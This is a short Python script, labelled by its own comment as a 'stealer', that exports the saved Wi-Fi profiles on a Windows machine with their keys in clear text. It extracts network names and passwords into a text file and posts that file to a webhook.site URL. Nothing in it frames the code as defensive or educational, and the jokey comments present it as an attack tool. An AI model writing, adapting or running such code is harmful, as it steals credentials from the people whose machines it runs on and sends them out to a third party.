from importlib.resources import path
import os
import subprocess
import os
import sys
import requests

#stealer URL
url= 'https://webhook.site/a15001d6-055d-459d-a3f4-b0ac688be093'
#Creating a file
password_file= open('passwords.txt',"w")
password_file.write("Hello user! Here are your passwords:\n\n")
password_file.close()
#Lists
wifi_files=[]
wifi_name=[]
wifi_password=[]
#For the Windows command
command=subprocess.run(["netsh","wlan","export","profile","key=clear"], capture_output=True).stdout.decode()
#For grabbing the current directory
path=os.getcwd()
#Do the hackies..lol
for filename in os.listdir(path):
    if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
        wifi_files.append(filename)
        for i in wifi_files:
            with open(i, 'r') as f:
                for line in f.readlines():
                    if 'name' in line:
                        stripped=line.strip()
                        front =stripped[6:]
                        back=front[:-7]
                        wifi_name.append(back)
                    if'keyMaterial' in line:
                         stripped=line.strip()
                         front =stripped[13:]
                         back=front[:-14]
                         wifi_password.append(back)
                         for x,y in zip(wifi_name, wifi_password):
                            sys.stdout=open("passwords.txt", "a")
                            print("SSID: "+x, "Password: "+y, sep='\n')
                            sys.stdout.close()    
#Send the hackies..hehe
with open('passwords.txt', 'rb') as f:
    r=requests.post(url,data=f)                         